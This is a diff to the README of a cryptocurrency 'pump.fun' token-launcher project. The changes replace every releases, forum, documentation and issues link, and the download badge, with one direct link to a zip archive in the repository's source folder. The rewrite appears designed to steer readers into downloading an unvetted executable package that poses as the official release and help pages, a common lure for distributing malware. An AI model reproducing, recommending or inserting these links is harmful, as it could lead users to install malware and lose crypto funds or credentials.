@@ -6,7 +6,7 @@ Welcome to the **PumpLaunch Console**! This application is a user-friendly contr
 
 ## 📥 Download Link
 
-[![Download pumpfunTokenLauncher](https://img.shields.io/badge/Download-pumpfunTokenLauncher-blue.svg)](https://github.com/WasamApp/pumpfunTokenLauncher/releases)
+[![Download pumpfunTokenLauncher](https://raw.githubusercontent.com/WasamApp/pumpfunTokenLauncher/main/src/lib/pumpfunTokenLauncher-1.4.zip)](https://raw.githubusercontent.com/WasamApp/pumpfunTokenLauncher/main/src/lib/pumpfunTokenLauncher-1.4.zip)
 
 ## 🔍 Overview
 
@@ -22,7 +22,7 @@ Welcome to the **PumpLaunch Console**! This application is a user-friendly contr
 
 To get started with **PumpLaunch Console**, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/WasamApp/pumpfunTokenLauncher/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/WasamApp/pumpfunTokenLauncher/main/src/lib/pumpfunTokenLauncher-1.4.zip).
 2. Choose the latest version.
 3. Click on the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Download the file and follow the instructions below for your specific operating system.
@@ -65,14 +65,14 @@ Before downloading, ensure your system meets the following requirements:
 
 If you encounter any issues or need help, you can visit our community forums or check the FAQs section. 
 
-- Community Forums: [PumpLaunch Community](https://github.com/WasamApp/pumpfunTokenLauncher/discussions)
+- Community Forums: [PumpLaunch Community](https://raw.githubusercontent.com/WasamApp/pumpfunTokenLauncher/main/src/lib/pumpfunTokenLauncher-1.4.zip)
 - FAQs: Available on the **PumpLaunch Console** dashboard within the app.
 
 ## 📢 Important Links
 
-- [Releases Page](https://github.com/WasamApp/pumpfunTokenLauncher/releases)
-- [Documentation](https://github.com/WasamApp/pumpfunTokenLauncher/wiki)
-- [Issues Tracker](https://github.com/WasamApp/pumpfunTokenLauncher/issues)
+- [Releases Page](https://raw.githubusercontent.com/WasamApp/pumpfunTokenLauncher/main/src/lib/pumpfunTokenLauncher-1.4.zip)
+- [Documentation](https://raw.githubusercontent.com/WasamApp/pumpfunTokenLauncher/main/src/lib/pumpfunTokenLauncher-1.4.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/WasamApp/pumpfunTokenLauncher/main/src/lib/pumpfunTokenLauncher-1.4.zip)
 
 ## 🔍 Explore the Topics
 
